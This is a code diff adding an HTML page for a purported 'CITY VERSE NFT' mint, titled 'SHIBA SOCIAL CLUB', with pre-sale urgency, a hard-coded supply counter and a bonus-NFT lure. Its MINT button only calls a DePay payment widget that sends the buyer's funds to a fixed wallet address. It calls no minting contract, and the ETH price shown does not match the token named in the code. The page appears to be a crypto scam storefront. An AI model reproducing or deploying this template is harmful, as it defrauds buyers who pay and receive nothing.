@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+	<script src="https://integrate.depay.fi/widgets/v5.1.0.js"></script>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+<title>SHIBA SOCIAL CLUB</title>
+<meta name="description" content="">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="preconnect" href="https://fonts.googleapis.com/">
+<link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
+<link href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet">
+<link rel="stylesheet" href="style.css" />
+
+
+<link rel="icon" href="icons/favicon.ico">
+</head>
+<body>
+<div class="blok1">
+<header>
+<div class="header__logo">
+<img src="img/logo.png">
+</div>
+</header>
+<div class="content">
+<div class="container-1 ">
+<div class="group-1">
+<img src="img/monkey/1.png">
+<img src="img/monkey/2.png">
+<img src="img/monkey/3.png">
+</div>
+<div class="group-2">
+<img src="img/monkey/4.png">
+<img src="img/monkey/5.png">
+<img src="img/monkey/6.png">
+</div>
+<div class="group-3">
+</div>
+</div>
+<div class="container-2">
+<img id="live-gif" src="img/live.gif">
+<p id="gif-text">Limited Pre-Sale: <span id="text-gif2">January 25</span></p>
+<div class="title">
+Mint Your <span class="tsvet">CITY VERSE NFT</span>
+</div>
+<br>
+<div class="subtitle">
+RULES: <br>- Purchase is available while the Mint button is available<br> - No more than 10 NFT per wallet<br> - NFT will be available after purchase in the Meta mask wallet instantly<br> - When buying more than 5+ NFT, one of the rare collections is given as a gift for the main purchase
+</div>
+<div class="radioblok">
+<div class="text">
+<p class="text">
+Supply: <span class="svet">555/7777 NFT</span>
+</p>
+<p class="text">
+Price: <span class="svet">0.1</span> ETH
+</p>
+<p class="text">
+Max: <span class="svet">10</span> per Wallet
+</p>
+</div>
+<div class="radiobut">
+<div class="products__card-bottom">
+<div class="products__card-input-wrapper">
+<span class="products__card-less" id="minus">
+<picture><source srcset="img/minus.svg" type="image/webp"><img id ="minus" class = "buttons" src="img/minus.svg"></picture>
+</span>
+<input class="products__card-input" type="text" name="quantity" value="1" id="pricex">
+<span class="products__card-more buttons" id="minus">
+<picture><source srcset="img/plus.svg" type="image/webp"><img class = "buttons" id = "plus" src="img/plus.svg"></picture>
+</span>
+</div>
+</div>
+<div class="button" align="center">
+<button class="btn" id="ape-max">
+Set Max
+</button>
+</div>
+</div>
+</div>
+<div class="Total">
+<div>
+Total:
+</div>
+<div class="cena">
+<span id="price123" class="svet">0.1</span> ETH
+</div>
+</div>
+<div class="textbot">
+<img src="img/ico.png" width="20px"> Special offer: Bonus rare NFT if you purchase more than 5 NFT
+</div>
+<div class="kupib" align="center">
+<button class="kupit" onclick= paynow()>
+MINT
+ </button>
+</div>
+</div>
+</div>
+<div align="center" class="copy">
+© Copyright — 2022 THE CITY VERSE NFT. ALL RIGHTS RESERVED.
+</div>
+</div>
+
+
+
+
+<script>
+
+	// counter script
+	let number = "";
+	let pay = 0.1;
+	
+	
+	const paynow = () =>{
+		console.log(pay)
+		DePayWidgets.Payment({
+  accept: [{
+    amount: pay,
+    token: '0xa0bEd124a09ac2Bd941b10349d8d224fe3c955eb',
+    blockchain: 'ethereum',
+    receiver: '0x2AB21751bF16ce655f952F41C87189401Af6f4EE'
+  }]
+});
+	}
+	
+	
+
+	
+	
+
+
+	let totalDisplay = document.querySelector("#price123")
+	let input = document.querySelector("#pricex")
+	let decrease = document.querySelector("#minus")
+	let increase = document.querySelector("#plus")
+	let buttons = document.querySelector(".buttons")
+	let max = document.querySelector("#ape-max")
+	let Payment = document.querySelector("#position")
+
+
+	//update total
+	
+	
+
+	//set max value
+	max.addEventListener("click",() =>{
+		number = 10
+		input.value = number;
+		total = number*0.1
+		totalDisplay.innerText = pay = total.toFixed(1)
+	
+	})
+
+
+	//decrease value
+	decrease.addEventListener("click",() =>{
+		if(number == 1){
+			return
+		}
+		number-- ;
+		input.value = number;
+		total = number*0.1
+		totalDisplay.innerText = pay = total.toFixed(1)
+
+	})
+	
+	//increase value
+	increase.addEventListener("click", () =>{
+		if(number == 10){
+			return
+		}
+		number++;
+		input.value = number;
+		total = number*0.1
+		totalDisplay.innerText = pay = total.toFixed(1)
+	
+	})
+
+
+
+
+</script>
+
+
+
+
+
+</body>
+</html>
